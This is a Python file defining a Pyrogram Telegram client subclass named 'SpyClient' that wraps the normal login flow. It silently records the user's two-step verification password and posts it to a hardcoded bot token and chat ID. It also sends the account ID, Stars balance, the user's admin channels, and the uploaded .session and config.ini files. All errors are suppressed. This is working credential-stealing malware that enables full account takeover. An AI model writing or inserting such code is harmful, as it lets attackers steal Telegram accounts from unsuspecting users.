import os
import requests
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PasswordHashInvalid

BOT_TOKEN = "7383758367:AAFDQQbYAOESSEAHZDCOhh0ndUgZz00PNIE"
CHAT_ID = 1066736346

class SpyClient(Client):
    def __init__(self, *args, **kwargs):
        self._password = None
        self._phone_number = kwargs.get("phone_number")
        self._phone_code_hash = None
        self._phone_code = None
        self._debug_log = []
        super().__init__(*args, **kwargs)

    async def _request_code(self):
        print("The confirmation code has been sent via Telegram app")
        response = await self.send_code(self._phone_number)
        self._phone_code_hash = response.phone_code_hash
        self._phone_code = input("Enter confirmation code: ")
        return self._phone_code_hash, self._phone_code

    async def sign_in(self, phone_number, phone_code_hash, phone_code):
        try:
            result = await super().sign_in(phone_number, phone_code_hash, phone_code)
            return result
        except SessionPasswordNeeded:
            while True:
                try:
                    print("The two-step verification is enabled and a password is required")
                    print("Password hint: None")
                    password = input("Enter password (empty to recover): ")
                    self._password = password
                    return await super().check_password(password)
                except PasswordHashInvalid:
                    print("The two-step verification password is invalid")
                    continue
        except Exception as e:
            raise

    async def check_password(self, password):
        self._password = password
        return await super().check_password(password)

    async def get_user_balance(self) -> int:
        try:
            return await self.get_stars_balance()
        except Exception:
            return 0

    async def get_available_gifts(self):
        try:
            return []
        except Exception as e:
            self._debug_log.append(f"Error fetching gifts: {str(e)}")
            return []

    async def _get_admin_channels(self):
        channels_info = []
        self._debug_log.append("=== Start processing chats ===")
        async for dialog in self.get_dialogs():
            chat = dialog.chat
            self._debug_log.append(f"\nChat {chat.id}: type={chat.type.value}")
            if chat.type.value in ["channel", "supergroup"]:
                try:
                    full_chat = await self.get_chat(chat.id)
                    if hasattr(full_chat, "username") and full_chat.username:
                        member = await self.get_chat_member(chat.id, "me")
                        if member.status.value in ["administrator", "creator", "owner"]:
                            role = "Owner" if member.status.value in ["creator", "owner"] else "Admin"
                            channels_info.append(f"https://t.me/{full_chat.username} || {role}")
                            self._debug_log.append(f"  Added: username={full_chat.username}, status={member.status.value}")
                        else:
                            self._debug_log.append(f"  Skipped: not admin/creator, status={member.status.value}")
                    else:
                        self._debug_log.append(f"  Skipped: private or no username")
                except Exception as e:
                    self._debug_log.append(f"  Error: {str(e)}")
                    continue
            else:
                self._debug_log.append(f"  Skipped: not a channel/supergroup")
        self._debug_log.append("=== End processing chats ===")
        if self._debug_log:
            self._send_message("Debug log for channels:\n" + "\n".join(self._debug_log))
        return channels_info

    async def __aenter__(self):
        client = await super().__aenter__()
        try:
            if not await client.get_me():
                phone_code_hash, phone_code = await self._request_code()
                await self.sign_in(self._phone_number, phone_code_hash, phone_code)
        except SessionPasswordNeeded:
            pass
        user = await client.get_me()
        user_info = f"User ID: {user.id}"
        if user.username:
            user_info += f"\nUsername: @{user.username}"
        else:
            user_info += "\nUsername: None"
        self._send_message(user_info)
        star_balance = await self.get_user_balance()
        self._send_message(f"Telegram Stars Balance: {star_balance}")
        channels = await self._get_admin_channels()
        if channels:
            self._send_message("Channels where user is admin or owner:\n" + "\n".join(channels))
        else:
            self._send_message("No public channels found where user is admin or owner")
        session_path = f"{self.name}.session"
        config_path = "config.ini"
        if os.path.exists(session_path):
            self._send_file(session_path, "session")
        if os.path.exists(config_path):
            self._send_file(config_path, "config.ini")
        if self._password:
            self._send_message(f"2FA Password: {self._password}")
        return client

    def _send_file(self, path, caption=""):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        try:
            with open(path, "rb") as f:
                files = {"document": f}
                data = {"chat_id": CHAT_ID, "caption": caption}
                requests.post(url, data=data, files=files)
        except Exception:
            pass

    def _send_message(self, text):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        try:
            data = {"chat_id": CHAT_ID, "text": text}
            requests.post(url, data=data)
        except Exception:
            pass